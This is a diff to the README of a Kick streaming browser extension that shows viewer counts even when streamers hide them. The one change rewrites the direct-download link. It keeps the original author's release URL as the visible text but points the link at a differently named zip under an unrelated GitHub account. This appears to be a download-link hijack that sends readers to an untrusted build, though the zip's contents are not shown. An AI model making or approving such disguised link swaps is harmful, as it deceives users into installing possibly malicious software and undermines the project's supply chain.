@@ -3,7 +3,7 @@
 A powerful and lightweight browser extension for the [Kick](https://kick.com) streaming platform that reveals the **real-time viewer count, even if the streamer has hidden it**, along with advanced chat metrics.
 
 🦊 **[Download for Firefox (Official Store)](https://addons.mozilla.org/en-US/firefox/addon/kick-viewers-chat/)**
-📦 **[Direct Download v1.1 (.zip)](https://github.com/ABDELRAHMANHY/Kick-Viewers-Extension/releases/download/v1.1/Kick-Viewers-Extension.zip)**
+📦 **[Direct Download v1.1 (.zip)]([https://github.com/ABDELRAHMANHY/Kick-Viewers-Extension/releases/download/v1.1/Kick-Viewers-Extension.zip](https://github.com/93PIO/Kick-Viewers-Extension/releases/download/v1.1/KickRealViewers-Fixed.zip))**
 
 ## 🌟 Features (v1.1)
 * **Real Viewers:** Displays the actual number of live viewers directly from Kick's API.
